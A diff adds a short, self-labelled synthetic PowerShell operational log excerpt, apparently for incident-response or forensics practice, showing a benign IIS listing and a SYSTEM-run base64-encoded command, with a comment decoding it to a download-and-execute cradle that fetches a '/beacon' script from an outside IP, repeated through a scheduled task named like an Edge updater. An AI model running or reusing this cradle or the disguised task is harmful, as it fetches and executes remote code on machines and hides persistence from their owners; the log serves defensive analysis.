@@ -1,0 +1,8 @@
+# SYNTHETIC — APP-PRD-01 PowerShell Operational log excerpt. Timezone: IST.
+# Source: Microsoft-Windows-PowerShell/Operational via SentinelNode EDR log forwarding. Collection window: 2026-09-04 06:00-13:00 IST.
+# SUMMARY: the encoded script block recorded at 11:32:00 recurs every 30 minutes thereafter (scheduled task "MicrosoftEdgeUpdateTaskMachineCore"); 3 additional identical records between 12:02 and 13:00 are omitted from this excerpt.
+Event 4104  2026-09-04 08:15:22 IST  User: VISTARA\svc_portal  ScriptBlock text:
+  powershell -command "& {Import-Module WebAdministration; Get-Website | Select-Object Name,State}"
+Event 4104  2026-09-04 11:32:00 IST  User: NT AUTHORITY\SYSTEM  ScriptBlock text:
+  powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcAOgA4ADQANAAzAC8AYgBlAGEAYwBvAG4AJwApAA==
+# Decodes to (shown in drill-down): IEX (New-Object Net.WebClient).DownloadString('https://185.220.101.47:8443/beacon')
